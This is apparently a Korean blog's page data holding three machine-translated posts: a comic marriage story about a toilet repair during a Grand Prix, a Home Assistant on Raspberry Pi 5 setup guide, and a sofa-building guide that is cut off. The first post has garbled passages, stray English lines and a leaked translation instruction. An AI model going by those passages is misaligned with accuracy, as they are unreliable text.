{"pageProps":{"posts":[{"title":"우리 집에 다른 남자가 필요해요  관계 문제 해결 방법 5가지","description":"","date":"2024-06-22 19:02","slug":"2024-06-22-IThinkWeNeedAnotherManinTheHouse","content":"\n\n## 내 인생에는 당신과 함께해야 할 저의 밉상이 있다는 것을 알았지만, 무엇인지는 아직 모르겠어요.\n\n![이미지](/assets/img/2024-06-22-IThinkWeNeedAnotherManinTheHouse_0.png)\n\n난 깜짝 놀랐어요. 사실 그냥 충격받았어요. 와이프가 아부다비 그랑프리를 보는 동안 집중해서 관람하고 있을 때, 내 안전지대에 들어와서 난방 중이던 카우치에 편히 앉아서 대사를 나눴죠.\n\n“우리 집에는 또 다른 남자가 필요해.”\n\n<div class=\"content-ad\"></div>\n\n보통 사람들은 내가 내 성역에 들어갈 때 나를 괴롭히지 않아. 집안에 나바뀐 닭 뼈, 피자 상자, 그리고 비어 있는 액체 용기들이 흩어져 있다. 그런 느낌이야.\n\n나는 수직적으로 도전받기 때문에 잘 정리되어 있지 않아. 이건 위장이야. 옷장 속에 숨어 있고, 순식간에 뛰어나와 행동할 수 있어. 아직은 뛰어나지 않았지만, 나는 뛰어날 수 있어.\n\n사람들은 놀라툴 거야.\n\n\"라스베이거스 F1 그랜프리 밤에 침대에 가고 싶지 않아서 이제 나를 침실에서 쫓아내려 하는 거니?\" 라고 브릭잖게 물었다.\n\n<div class=\"content-ad\"></div>\n\n\"안 돼요. 아니요,\" 그녀가 말했다. \"당신은 여전히 내 식사 담당자이자 침대 담당자야.\"\n\n나는 혼란스러웠다. 그녀는 그것을 알아챌 수 있었다. 30년의 결혼 생활과 혼란의 징후는 마치 서양인이 문화를 잘 모르는 독자가 제3자의 현지 마상을 읽는 것만큼 명확하게 보였다 ... 왜 극세 군말을 사용하여 \"채식주의자가 되면 언제나 이름이 카렌이 되는지\"에 대해 쓴 고대 명조체 명문서를 읽는 느낌으로.  \n\n누군가는 \"순둥한 모래처럼 명확하다\"고 할 것이다. 하지만 나는 작가니까 더 많은 말을 찾아야 해. 말이 많음이 법칙이잖아!!\n\n\"나와 함께와,\" 그녀가 말했다.\n\n<div class=\"content-ad\"></div>\n\n저는 가고 싶지 않았어요. 반 시간 뒤에 아부다비 그랑프리가 시작되고 있었는데, 이제 갱년기 증상이 나타나면서 그녀는 몸을 풀기 위해 좋은 30분이 걸려요. 이대로라면 출발 랩을 놓치려 할 수도 있을 거예요.\n\n하지만 또 다른 남자의 위협이 저를 행동에 나서게 만들었어요. 저는 팝콘을 놓고 맥주도 놓고 그녀를 따라 복도를 따라 내려갔어요. 우리 침실 문 바로 앞을 지나갔어요.\n\n휴! 생각했어요.\n\n하지만 그때 제 불안감이 두려움으로 바뀌었어요. 그게 아니면 뭐지? 그녀는 우리 욕실로 향했어요.\n\n<div class=\"content-ad\"></div>\n\n\"I thought that was bold! Maybe I can catch up on the formation lap on TV later.🏎️\"\n\n\"Wow, you went for it!\"\n\n\"Placing her hands on each side of the closed toilet, gripping the seat tightly.\"\n\n<div class=\"content-ad\"></div>\n\n네, 네\n\n그녀는 나를 향해 돌아서 내 눈 속으로 깊이 쳐다봤어.\n\n배리 화이트의 노래인가요?\n\n그리고 왼쪽에서 오른쪽으로 흔들기 시작했어. 바닥과 변기 팬 사이의 접착제가 벗겨지기 시작했어.\n\n<div class=\"content-ad\"></div>\n\n“너도 봤지,” 그녀가 나에게 돌아서며 말했다. “그래서 집에 또 다른 남자가 필요한거야. 난 니한테 고쳐달라고 했는데, 더 흔들리잖아.”\n\n나는 즉각 대답했다.\n\n“응, 그런데 넌 내게 뭘 해달라고 했니,” 물었다.\n\n내 머릿속에선 판사가 주목하고 배심원단이 내 손바닥 안에 있었다. 법정은 죽은 물고기 물고리처럼 조용했다.\n\n<div class=\"content-ad\"></div>\n\n이 소리를 들었어요... 그리고 확인할 수 있어요, 아무 소리도 들리지 않아요. 제가 탱크를 청소한 후에 모터를 다시 켜놓는 걸 잊었기 때문에 그래요. 무엇을 생각하고 있는지 알아요... 그리고 동의해요.\n\n결과를 고려하면 탱크 청소는 시간낭비였어요.\n\n\"수리해 달라고 했잖아요,\" 그녀가 답했어요.\n\n알았어요! 난 툭 하고 말했어요.\n\n<div class=\"content-ad\"></div>\n\n\"그 한 가지야,\" 나는 강조하며 대답했다. \"고쳐,\" 나는 법원 카메라를 향해 봤다. \"너(의도적으로 가리키고 있던 그녀를 가리키며, 보통 내가 허용되지 않은 행동이지만 이건 법정이었으니까), 나한테 '수리해 줘' 라고 안 했다,\" 나는 대답했다. \"너가 수리해 달라고 했다면, 나는 수리 작업을 했을 텐데. 이건 고치는 작업이야. 뭔가...하지만 고쳤다고 하기 충분하지 않아,\" 나는 외쳤다.\n\n\"제대로 부드러워져,\" 그녀는 소리쳤다. 그러나 입가에 미소가 번졌다.\n\n그 미소는 무엇을 알려주는 거야. 나는 카드를 치니까. 나는 이런 것들을 알아. 난 법정에서 승리하고 있었고 그녀도 그걸 알고 있었지.\n\n\"알았어,\" 그녀는 내 옆을 지나갔다. 욕실 문 너머에 서 있으면서 직접 향했고, 연습실로 가는 길을 쭉 따라 내려가서 전날 설치했던 벽걸이 책장을 가리켰다.\n\n<div class=\"content-ad\"></div>\n\n그레이프바인이라고도 하는 화분은 포도와 다육식물에 적합합니다. 플랜터랑 잘 어울리고, 선원을 채우기에 딱 좋아요.\n\n<div class=\"content-ad\"></div>\n\n\"그럴 기분이 아니야,\" 많은 일을 해야할 것처럼 대답했어요. 사실은 제가 할 일이 많았거든요. 팝콘이 좀 더 소금이 필요하다고 생각했어요. 이 중요한 일을 지금 하러 갈게요.\n\n\"그럼 나가서 할게,\" 그런 그녀가 책을 집었어요.\n\n여기서 멈춰야 해요. 왜냐하면 나중에 그 책이 논쟁의 중심이 되었고 몇 시간 후에 누구가 맞았는지 틀렸는지를 결정할 거기 때문이에요.\n\n제가 말했죠, 그것은 워 앤 피스의 두꺼운 하드커버 복판만한 크기의 책이라고 그녀는 말했어요, 얇은 소설 컵지.\n\n<div class=\"content-ad\"></div>\n\n저 중 한 명이 틀렸어요.\n\n그녀는 책을 책장에 올려놓으려고 시도했는데, 동시에 두 가지 일을 했어요. 한편으론 책이 미끄러지고... 그리고 또한 선반의 폭에 맞지 않았어요.\n\n\"이 선반,\" 그녀가 외쳤어요, \"당신의 정자 하나를 담을 수 없네,\" 그녀가 외쳤어요.\n\n\"절대로 가능해요,\" 저는 격렬히 반박했어요. 그녀가 증명하라고 하지는 않을거라는 걸 아는데 말이에요. 저랑 정말 역겹게 될 테니까요, 아이들도 주위에 있으니까요.\n\n<div class=\"content-ad\"></div>\n\n하지만 거기서 멈추지는 않았어요. 저는 \"결혼 법정용어\"에서 말하는 바와 같이 30년 이상의 \"결혼 클럽\"에서 사건을 확고히 기록하기로 결심했어요.\n\n그리고 맞아요, 정말로 클럽입니다. 그 이유는 다음과 같아요:\n\n가입하고 싶어 죽겠고, 허가를 받고, 비용을 내고, 회원 자격을 얻은 뒤에 처음 한 주에는 기쁘기만 한데, 그 후에는 클럽 규칙 위반으로 회칙 위반 심사위원회(1인)와 '비밀회의'를 해야 하는 상황이 오게 된다는 것입니다. 그 이후로는 모든 게 좌절되죠.\n\n제가 처음 어겨버린 규칙은 더러운 세탁물통이었어요. 보니까, 농구골대가 아니랍니다. 그리고 놓친 공들을 주워주는 볼 보이도 없다는 거잖아요. 미쳤죠?\n\n<div class=\"content-ad\"></div>\n\n\"그대로 표 태그를 마크다운 형식으로 변경해주세요.\"\n\n<div class=\"content-ad\"></div>\n\n잠시 지나고 나니...\"메인스플레인, 맨스플레인, 맨스플레인,\" 하며 그녀가 무표정해지는 모습을 보았기 때문에 마지막 주장으로 넘어갔어요.\n\n\"벽걸이 서랍장에 책을 놓고 싶었다면 단어 '빌리처럼'을 포함하셔야 했고, 그랬다면 명백히 이해했을 텐데요. 그에 맞춰 만들었을 텐데요. 하지만 그렇지 않았기 때문에 매개변수도 설정되지 않았습니다.\" 그리고 그로써 나의 케이스를 마무리했어요.\n\n그 후 파라미터/경계의 중요성에 대해 아이들과 관계에서 설명을 이어나갈 예정이었지만, 그녀의 주먹은 불평등한 색을 띤 벽난로 포커를 꽉 쥔 채 되어 있었어요.\n\n그녀는 저를 바라봤다가 3초 가량 지나고 그 불멸의 말을 내뱉었어요,\n\n<div class=\"content-ad\"></div>\n\n\"새로운 남자가 온다는데, 수리공 로베르토와 이야기했는데, 그가 당신 자리를 대신 할 거라고 해. 당신의 DIY 기술은 당신의 부인과 변명만큼 비참해. 이것에 대해 어떻게든 대처해.\"\n\n그래서 나는 그렇게 했어. 난 주방으로 내달려가서 내 팝콘에 소금을 뿌렸지,\n\n이거 받아라 쉐키.\n\n나는 그 후에 소파에 쓰러지듯이 엎드려서 올해의 마지막 그랑프리를 보았어.\n\n<div class=\"content-ad\"></div>\n\n파이프에 넣어 피우세요.\n\n이제 많은 사람들이 이렇게 말할 수도 있어요. \"그건 화남이나 분노가 아니죠.\" 하지만 내가 말하고 싶은 건, 그 때 있어야만 알 수 있었어요. 참으로 강렬했거든요.\n\n그리고... 나는 한 번도 그녀에게 누가 그랑프리에서 이기고 있는지 말하지 않았어요. 그녀가 F1을 싫어하고 페라리와 유키 쯔노다를 구별하지 못한다는 사실은 중요하지 않아요. 요점은, 나는 그녀를 무시했다는 거에요.\n\n정말 고배를 헤쳐가며 그랑프리에 집중하기가 어려웠어요. 막스는 또 한 번 우승하고 있었고, 나는 로베르토 공사와의 악한 계획을 꾸미고 있었어요.\n\n<div class=\"content-ad\"></div>\n\n내 손에서 그는 푹 익은 파스타가 될 것 같아요.","ogImage":{"url":"/assets/img/2024-06-22-IThinkWeNeedAnotherManinTheHouse_0.png"},"coverImage":"/assets/img/2024-06-22-IThinkWeNeedAnotherManinTheHouse_0.png","tag":["Tech"],"readingTime":5},{"title":"라즈베리 파이 5에서 홈 어시스턴트로 스마트 홈 혁신하는 방법","description":"","date":"2024-06-22 19:01","slug":"2024-06-22-TransformYourSmartHomewithHomeAssistantonRaspberryPi5","content":"\n\n스마트 홈 자동화의 미래에 오신 것을 환영합니다! 이 게시물에서는 Raspberry Pi 5에 Home Assistant를 설치하는 방법을 살펴보겠습니다. Home Assistant는 모든 스마트 기기를 하나의 쉽고 간편한 인터페이스로 통합하는 강력한 오픈 소스 플랫폼입니다. 누구나 쉽게 시작할 수 있도록 도와주는 본 가이드를 통해 고급 기술 애호가든 호기심 많은 초보자든 Raspberry Pi 5에서 Home Assistant를 시작하는 방법을 알아보세요.\n\n## 왜 Home Assistant를 선택해야 하나요?\n\nHome Assistant는 스마트 홈 기기에 대한 우수한 유연성과 제어를 제공합니다. 이것이 홈 자동화를 선택하는 이유 중 몇 가지는 다음과 같습니다:\n\n- 오픈 소스 플랫폼: Home Assistant는 지속적으로 개발자 커뮤니티에 의해 업데이트되어 최신 기능과 통합에 대한 접근 권한을 제공합니다.\n- 다양한 기기 호환성: 다양한 스마트 홈 기기를 지원하여 조명부터 온도조절기, 보안 카메라, 센서까지 모든 것을 쉽게 제어할 수 있습니다.\n- 사용자 정의 자동화: 집의 효율성과 편의성을 향상시키는 복잡한 자동화를 작성할 수 있습니다.\n- 개인 정보 중시: Home Assistant는 데이터를 로컬에서 처리하여 안전하고 개인 정보를 존중하는 환경을 제공합니다.\n\n<div class=\"content-ad\"></div>\n\n## 왜 Raspberry Pi 5를 사용해야 하나요?\n\n라즈베리 파이 5는 강력한 사양과 저렴한 가격으로 홈 어시스턴트를 운영하는 이상적인 하드웨어입니다. 여기에는 다음과 같은 이유가 있습니다:\n\n- 향상된 성능: 더 빠른 프로세서와 더 많은 RAM으로 Raspberry Pi 5는 여러 작업과 복잡한 자동화를 원활하게 처리할 수 있습니다.\n- 연결 옵션: 기가비트 이더넷 및 USB 3.0을 포함한 향상된 연결 옵션을 통해 디바이스와의 빠르고 안정적인 통신이 가능합니다.\n- 경제적 가격: 다른 스마트 홈 허브와 비교했을 때 저렴한 가격으로 다양한 사용자들에게 접근성을 제공합니다.\n\n## Raspberry Pi 5에서 홈 어시스턴트 설정하기\n\n<div class=\"content-ad\"></div>\n\n설정 과정을 시작해 봅시다:\n\n1. 하드웨어 준비하기:\n\n- Raspberry Pi 5\n- MicroSD 카드 (16GB 이상)\n- 전원 공급 장치\n- 이더넷 케이블 또는 Wi-Fi 동글\n- 초기 설정을 위한 모니터, 키보드, 마우스\n\n2. 홈 어시스턴트 OS 다운로드하기:\n\n<div class=\"content-ad\"></div>\n\n- 홈 어시스턴트 웹사이트에 방문해서 라즈베리 파이 5용 홈 어시스턴트 OS 이미지를 다운로드하세요.\n\n3. MicroSD 카드에 이미지 플래시:\n\n- Balena Etcher와 같은 도구를 사용하여 다운로드한 이미지를 MicroSD 카드에 플래시하세요.\n\n4. 라즈베리 파이 설정하기:\n\n<div class=\"content-ad\"></div>\n\n- MicroSD 카드를 라즈베리 파이에 삽입하세요.\n- 이더넷 또는 Wi-Fi를 통해 라즈베리 파이를 네트워크에 연결하세요.\n- 라즈베리 파이를 켜세요.\n\n5. 홈 어시스턴트에 액세스:\n\n- 수 분 후, 컴퓨터의 웹 브라우저를 열고 http://homeassistant.local:8123주소로 이동하세요.\n- 계정 생성 및 기본 설정 구성을 포함한 초기 설정을 완료하기 위해 화면 안내에 따라 진행하세요.\n\n## 홈 어시스턴트 대시보드 탐색\n\n<div class=\"content-ad\"></div>\n\n홈 어시스턴트 대시보드는 모든 스마트 홈 기기를 관리하는 명령 센터입니다. 여기에 주요 기능을 간략히 소개합니다:\n\n1. 개요:\n\n- 귀하의 기기 및 현재 상태에 대한 요약을 표시합니다. 이 보기를 사용자 정의하여 한눈에 가장 중요한 정보를 볼 수 있습니다.\n\n2. 지도:\n\n<div class=\"content-ad\"></div>\n\n- 지도 상에 기기의 실시간 위치를 표시하여 위치 기반 자동화에 유용합니다.\n\n3. 로그북:\n\n- 홈 어시스턴트 설정 내 이벤트 및 변경 사항의 상세한 이력을 유지하여 문제 해결 및 기기 동작 이해에 도움이 됩니다.\n\n4. 기록:\n\n<div class=\"content-ad\"></div>\n\n- 장치에 대한 온도 추세나 에너지 사용량과 같은 데이터와 그래프를 시간에 따라 표시합니다.\n\n5. 개발자 도구:\n\n- 고급 사용자를 위한 강력한 섹션으로, 자동화를 테스트하고 장치 상태를 확인하며 직접 명령을 실행할 수 있습니다.\n\n6. 구성:\n\n<div class=\"content-ad\"></div>\n\n- 통합, 자동화, 사용자 및 일반 설정을 관리합니다. 여기서 Home Assistant 환경을 설정하고 세밀하게 조정하는 데 많은 시간을 소비할 것입니다.\n\n## 일반 문제 해결\n\n마주치게 될 일반적인 문제 중 하나는 \"Home Assistant CLI가 시작되지 않습니다! 비상 콘솔로 이동\" 오류입니다. 해결 방법은 다음과 같습니다:\n\n비상 콘솔에 액세스하기:\n\n<div class=\"content-ad\"></div>\n\n- Raspberry Pi에 모니터와 키보드를 연결하세요. 오류 메시지가 표시되면 Enter를 눌러 콘솔에 접속하세요.\n\n디스크 공간 확인:\n\n- 디스크 용량이 가득 찼는지 확인하려면 df -h를 실행하세요. 가득 찼다면 일부 공간을 확보해주세요.\n\n로그 확인:\n\n<div class=\"content-ad\"></div>\n\n- 특정 오류 메시지를 확인하려면 journalctl -xe를 사용하세요.\n\n파일 시스템 복구:\n\n- 훼손된 파일 시스템을 의심한다면 루트 파티션을 umount /dev/sdX1 (디스크 식별자 X로 대체)로 마운트 해제하고 fsck를 실행하세요.\n\n재부팅:\n\n<div class=\"content-ad\"></div>\n\n- 필요한 수정을 완료한 후 sudo reboot으로 Raspberry Pi를 다시 부팅하십시오.\n\n## 결론\n\nRaspberry Pi 5에 Home Assistant가 설치되면 스마트 홈을 관리하기 위한 강력하고 유연하며 경제적인 솔루션을 얻을 수 있습니다. 이 안내를 따라 Home Assistant를 설정하고 기능을 탐색하며 일반적인 문제를 해결하여 더 스마트하고 효율적인 홈을 만들 수 있습니다.\n\n더 많은 기술 자습서 및 업데이트를 보려면 Medium에서 저를 팔로우하고 YouTube 채널인 IT Samurai Teacher를 구독하세요.\n\n<div class=\"content-ad\"></div>\n\n#홈어시스턴트 #라즈베리파이5 #스마트홈 #홈자동화 #기술튜토리얼 #IT사무라이선생 #자작 #스마트홈기기\n\n질문이나 의견이 있으시면 언제든지 연락해주세요. 즐거운 자동화되는 시간 보내세요! 🚀","ogImage":{"url":"/assets/img/2024-06-22-TransformYourSmartHomewithHomeAssistantonRaspberryPi5_0.png"},"coverImage":"/assets/img/2024-06-22-TransformYourSmartHomewithHomeAssistantonRaspberryPi5_0.png","tag":["Tech"],"readingTime":4},{"title":"소파 제작을 위한 7단계 가이드 디자인부터 마감까지","description":"","date":"2024-06-22 18:59","slug":"2024-06-22-Soyouwanttomakeasofa","content":"\n\n지난해 새 집을 샀어요. 처음으로 집주인이 되어서 (아파트지만 비슷한) 작은 스튜디오 아파트에서 큰 집으로 이사를 했어요. 가벼운 짐만 가지고 있었기 때문에 가구는 롤링 컴퓨터 의자와 컴퓨터 테이블 말고는 없었어요 (식탁이나 침대 프레임 조차 없었어요). 이사한 집에 가구를 갖춰야 했죠. 온라인과 오프라인 매장에서 소파를 보고 가격이 $600부터 $2,000까지 다양하게 보였는데, 원하는 디자인들은 대부분 $1,000 이상에 판매되었어요. 그때 '소파를 만들어 보자!' 라는 생각이 들었어요.\n\n소파를 만들기 어려운지 온라인에서 살펴보니, 이과정을 문서화하고 왜 어떤 것들이 필요한지, 왜 특정 차원으로 만들어졌는지, 소파 바닥에 왜 스프링이 있는지 설명하는 리소스가 그리 많지 않다는 것을 깨달았어요. DIY와 Instructables 시대에도 계획과 도면을 보여주는 제작 과정 문서가 있을 거라고 생각했지만, 오직 호주에서 한 가지만 찾을 수 있었어요. 그래서 소파를 만들고 가구 제작의 세계에 뛰어들며 이 연구를 문서화하고, 누군가가 이 정보를 소파 만들 때 유용하게 사용하길 바랍니다. 이 글에서 빠진 유일한 것은 청사진이지만, 제가 직접 그려야 할 거예요 (내 자신을 위해 만든 스케치 대신에).\n\n# 소파 배경\n\n소파의 제작 방법과 이유에 앞서 몇 가지 메모해야 할 사항이 있어요. 많은 좋은 소파가 $1,000 이상의 가격인 이유가 있어요. 아래 두 가지 기술이 필요하기 때문이죠:\n\n<div class=\"content-ad\"></div>\n\n- 목공예 - 전원 도구, 전통 도구 및 조인트 사용\n- 바느질 - 쿠션 만들기, 패브릭 가구 도구 사용\n\n만약 바느질을 할 수 없다면, 맞춤형 쿠션을 추가 비용 지불하여 상점에서 구입할 수 있습니다. 만약 목재 절단 도구를 사용할 수 없거나 목재 조인트를 만들 수 없다면, 이 프로젝트는 적합하지 않을 수 있습니다. 그런데 여전히 소파를 만들고 싶지만 위와 같은 기술을 갖추지 못했다면, 사람들이 만든 팔레트 침대 소파가 있습니다. 아마 가장 쉽고 간단한 방법 중 하나로 만든 대충 만든 소파입니다. 그러나 전통적인 소파만큼 우아하지는 않을 수 있습니다.\n\n# 전통 vs 현대\n\n소파를 만드는 두 가지 방법이 있습니다: 전통적인 방법과 현대적인 방법입니다. 전통적인 소파는 꽃무늬 디자인이 있는 빈티지 소파로, 내재적으로 조각된 목재로 만들어졌거나 순전히 목재일 수도 있습니다. 이러한 디자인에서는 쿠션이 패브릭에 직접 만들어지고 스프링이 바닥에 묶입니다. 쿠션이나 패브릭이 어떤 식으로든 파손되었을 경우, 수리하기 위해 전체 소파를 다시 만들어야 할 가능성이 높습니다. 또한, 이러한 것들을 제대로 만들기 위해서는 능숙함이 필요합니다.\n\n<div class=\"content-ad\"></div>\n\n새로운 현대 디자인은 스프링과 쿠션을 분리하여 교체 가능한 쿠션과 다양한 유형의 스프링을 바닥에 사용하고 있어요. 현대 디자인은 일반적으로 깔끔한 선과 가정에서 흔히 보는 \"소파\" 모양을 갖추고 있어요. \"소파\"라고 말했을 때, 당신이 떠올리는 것은 현대적인 소파일 것이고 전통적인 소파가 아닐 겁니다.\n\n간편함을 위해서, 저는 현대 디자인을 선택했어요. 게다가 전통적인 소파를 만들 수 있는 만큼의 솜씨도 없고, 만들기 위해서 필요한 수십 시간의 작업과 특수 도구까지 필요하기 때문이죠.\n\n# 스프링 대 웨빙\n\n소파 쿠션 아래에는 더 편안한 앉는 경험을 만들기 위한 또 다른 지원 시스템이 있어요. 스프링과 웨빙 두 가지 지원 방법이 있어요. 웨빙은 가장 싼 방법으로, 프레임을 가로지르는 2~3인치 반탄성 밴드를 짜는 방식입니다. 이 방법은 가장 저렴한 선택이지만 대부분의 곳에서 소파를 구매할 때 이 방법을 피하도록 권장해요. 장점은 스프링이 닳거나 정렬되지 않는 경우에 발생하는 스리는 소리가 없다는 점이에요.\n\n<div class=\"content-ad\"></div>\n\n스프링에는 두 가지 방법이 있어요. 첫 번째는 S-스프링이에요. 이것은 일반 코일 스프링의 저렴한 버전이라고 할 수 있어요. 대신 이러한 부드럽고 무거운 철재 스프링이 소파 아래쪽을 따라 늘어선다는 특징이 있어요. 아마도 소파를 뒤집어 본 적이 있다면 보았을 거예요. 저는 이것이 가장 일반적으로 사용되는 스프링 종류이라고 생각해요.\n\n두 번째 방법은 고급 팔방향 타이 스프링이에요. 이 방법은 소파의 기초에 고르게 설정된 코일 스프링으로, 고품질의 줄로 묶여 있어요. 서로 묶여 있고 소파에 묶인 채로 여덟 가지 방향으로 교차되며, 이로써 스프링이 어디에 앉더라도 무게를 나눠 가질 수 있게 되는 거에요. 이러한 스프링 방법 덕분에 소파의 비용이 2,000달러일 수도 있지만, 가장 견고한 지지대가 되어 줘요.\n\n간단하게 말씀드리자면, 저는 소파에 웨빙(webbing)을 사용하는 걸 선택했어요. 웨빙 자체가 소파를 캐주얼하게 사용하는 경우에는 나쁘지 않아요. 하지만 아이들이 소파 위에서 뛰놀거나(혹은 당신이 뛰고 싶을 때) 발생하는 경우에는 스프링이 훨씬 나아요.\n\n## 부가 설명\n\n<div class=\"content-ad\"></div>\n\n아마도 \"왜 단단한 나무 조각 위에 큰 쿠션을 올리면 안 되나요?\" 라고 궁금해하실 수도 있습니다. 이유는 단단한 지지대는 모든 압력을 쿠션에 가하므로 쿠션이 빠르게 마모됩니다. 스프링과 웹빙은 압력을 상쇄하기 위해 존재하며 쿠션의 빠른 마모를 방지하고 더 많은 탄성을 부여합니다. 실제로 스프링이나 단단한 나무 위에 큰 폼 쿠션을 올린 소파에서 점프해 보면 차이를 느낄 수 있습니다. 소파를 만들 때 정말 싼 재료를 사용하고 오래 사용하지 않을 계획이라면 그렇게 할 수도 있지만, 단단한 나무 벤치에 앉는 느낌이 들지 않도록 큰 쿠션으로 상쇄하고 나무에 통기홀이 있어야 합니다.\n\n# 못 총 대 비즈\n\n사소한 일이지만 소파에 천과 스프링/웹빙을 부착하는 두 가지 방법이 있습니다. 전통적인 태피스트리 못 총 또는 전기/공압 스테이플건을 사용하는 두 가지 방법입니다. 태피스트리 못은 웹빙과 천을 부착하는 전용 못 총으로 예전 방식입니다. 새로운 현대적인 방법은 모든 것을 스테이플로 고정하는 것이며 저는 스테이플을 사용했어요. 손으로 작동하는 스테이플건을 사용할 수도 있지만 이 정도 크기의 것에는 손과 팔을 소모할 것입니다.\n\n# 표준 치수\n\n<div class=\"content-ad\"></div>\n\n그러면 소파의 크기는 어떤가요? 3인용 소파는 일반적으로 길이 85인치, 깊이 35인치, 높이 35인치인데, 이건 대략적인 지침일 뿐이에요. 일반적으로 최대 길이는 85인치를 추천하는데, 그 이상이면 계단을 올라갈 때 더 어려워질 거예요 (피벗 포인트!), 하지만 보통의 소파도 이 문제를 갖고 있어요. 소파의 깊이는 대부분 30-35인치 사이에 있어요. 소파의 높이는 일반적으로 30-36인치이며, 대부분 디자인과 다른 가구 높이와 잘 어울리는 정도로 결정돼요.\n\n이제 소파의 블록 크기에 대해 대략적인 개념을 알게 됐으니, 아마 고려하지 않았던 세부사항을 살펴볼까요? 좌석 높이가 얼마인가요? 디자인에 따라 다르지만 가장 일반적인 것은 바닥에서 좌석 쿠션까지 18인치입니다. 13인치에서 20인치까지 다양하며, 개인의 취향과 신장에 따라 다를 수 있어요. 좌석 높이가 높을수록 신장이 작은 경우 발이 더 많이 매달릴 수 있어요.\n\n좌석 깊이는 얼마인가요? 이는 좌석 쿠션 앞부분부터 등받이 쿠션까지의 길이입니다. 대부분 20-21인치 정도가 표준이에요. 등받이의 좌석 높이는 어떤가요? 표준은 15인치이지만 다시 말하지만, 디자인과 사람의 신장에 따라 다를 수 있어요.\n\n또한 좌석 기울기 문제도 있습니다. 기술적으로 말하자면, 다수의 곳들이 다리가 편안히 매달리도록 정면에서 90-100도 각도를 제안합니다. 등받이 기울임은 더 직립형 소파의 경우 5도, 더 캐주얼한 등받이의 경우 15도입니다. 이 모든 것이 중요하다고 생각하지 않는다면, 모든 것을 직각으로 맞추고 쿠션을 사용하세요. 그게 제가 선택한 방법이에요.\n\n<div class=\"content-ad\"></div>\n\n# 원단\n\n사용자의 취향에 따라 선택할 수 있는 것이 많아요. 저는 부드럽고 가죽이 아닌 것을 원했기 때문에 마이크로파이버를 선택했어요. 다양한 원단을 가게에서 찾아보고 어떤 것이 더 맘에 드는지 확인해보세요. 일반적으로 더 좋은 소재일수록 야드 당 비용이 비싸요. 또한, 만약 소밍에 익숙하다면 가 구두보다 두껍기 때문에 적절한 바늘로 원단을 꿰어야 합니다. 만약 소잉 머신을 사용한다면, 스트레스가 바늘과 모터를 파괴하지 않도록 주의해야 해요. 다행히도 마이크로파이버는 저렴하면서 비교적 얇아서 일반 소잉 머신과 간단한 바늘을 사용할 수 있어요.\n\n# 디자인\n\n마침내요! 그 모든 연구 끝에, 이제 프레임을 그리고 진짜로 원하는 것을 결정할 때가 왔어요. 디자이너가 아니거나 원하는 것을 모르는 경우에는 선택 사항입니다. 제 경우에는 현대적인 스타일로 소파를 만들고자 했고, 이동하기 쉬운 모듈식으로 만들었고, 도구가 없어서 곡선을 만들거나 깎거나 손으로 갈아내지 않도록 했으며, USB 포트가 달려 있을 것을 원했어요. USB 포트를 왜 달았냐구요? 전화기를 작은 테이블 위에 올려놓고 충전할 수 있도록 하기 위해서예요.\n\n<div class=\"content-ad\"></div>\n\n\n![Sofa Design 1](/assets/img/2024-06-22-Soyouwanttomakeasofa_0.png)\n\n원하는 정확한 모양이 없어 여러 가지 소파 디자인을 구글에서 많이 검색했어요. 좋아하는 몇 가지를 바탕으로 여러 개의 스케치를 그렸는데, #2번을 선택했어요.\n\n![Sofa Design 2](/assets/img/2024-06-22-Soyouwanttomakeasofa_1.png)\n\n디자인이 있으니 이제 치수를 계산해야 했어요. 치수를 그릴 때는 나무의 너비를 고려해야 해요. 숫자를 기반으로 측정을 하지 않고 실제로 측정해야 해요. 예를 들어, 일반적인 2x4는 2인치 x 4인치를 시사하는데, 실제 측정은 1.5인치와 3.5인치에요. 만약 2x4로 무언가를 만들려고 한다면, 실제 크기와 일치하지 않을 거에요. 그래서 숫자를 반드시 재확인해야 해요. 못색과 홈목을 만든다면, 절단하기 전에 반드시 고려해야 해요.\n\n\n<div class=\"content-ad\"></div>\n\n# 도구 및 재료\n\n이 프로젝트를 위해 구입한 도구 및 자터 목록은 다음과 같습니다:\n\n## 도구\n\n- 24 이빨 7 1/4\" 블레이드가 장착된 12 앰프 7 1/4\" 원형 톱\n- 청력 보호용품\n- 전기 스테이플 건\n- 해삭톱\n- 끌 기어 세트\n- 고무 망치\n- 해삭 톱날\n- 말발  대\n- 강화강 삼각형 자\n- 웹빙 늘리기\n- 페이스 클램프가 장착된 포켓홀 지그 시스템\n- 1/2인치 H 스타일 파이프 클램프\n- 염료 브러시\n\n<div class=\"content-ad\"></div>\n\n## 재료\n\n- USB 커플러 (F/F) A/B + USB 케이블\n- 폼 좌석 쿠션 (2.4/ ILD 40) 및 등받이 쿠션 (2.8/ ILD 34)\n- Elasbelt 2인치 164피트 롤 (좌석용 1개, 등받이용 1개)\n- 마운트 안나 마이크로파이버 쉘 원단\n- 패브릭 지퍼 + 지퍼 슬라이드\n- 2\"x4\"x96\" 목재 스터드\n- 2\"x6\"x96\" 목재 스터드\n- 강철 40 36\" 파이프 1/2\"\n- T50 5/16\" 스테이플\n- 목재 스테인 및 실링\n- 포켓 스크류\n\n파이 그래프로 비용을 나타내면, 소파 비용의 대부분이 어디에 소요되는지 확인할 수 있어요:\n\n![그래프 이미지](/assets/img/2024-06-22-Soyouwanttomakeasofa_2.png)\n\n<div class=\"content-ad\"></div>\n\n\n![이미지](/assets/img/2024-06-22-Soyouwanttomakeasofa_3.png)\n\n재료가 대부분을 차지하고, 그 중에서도 소파 쿠션은 가장 비싼 부분입니다. 대부분의 도구를 이미 가지고 있다면, 제가 모든 것을 구매해야 해서 가격이 33% 더 비쌉니다 (드릴과 척삭줄은 이미 소유하고 있었습니다).\n\n# 시공\n\n# 목재 프레임\n\n\n<div class=\"content-ad\"></div>\n\n이제 디자인, 측정값, 도구 및 재료를 모두 준비했으니, 소파를 만드는 시간이에요! 먼저, 디자인에 따라 나의 측정값을 기반으로 보드를 적절한 크기로 잘랐어요. 모든 것이 맞는지 확인하고 다시 그려 보았죠. 자를 때에는 \"한 번 재고 두 번 자르라\"는 이른바 가르침을 따랐어요. 거리를 잰 후 표시를 하고, 선을 긋고, 다시 한 번 재어 정확한지 확인하였죠. 자르고 난 후, 마지막 조각을 재어 길이가 맞는지 확인했어요. 측정하는 일이 많지만, 모두 한 번에 자르고 아무것도 맞지 않는 것보다 낫죠.\n\n<div class=\"content-ad\"></div>\n\n베이스 부분은 전통 못이와 쇠망이 접합으로 상부를 만들었어요. 이 방법을 선택한 이유는 가구가 모든 방향에서 매우 강한 연결부인 메카닉적인 접합을 가져야 한다고 생각해서예요. 이 방법은 나사를 사용하는 것보다 시간이 훨씬 오래 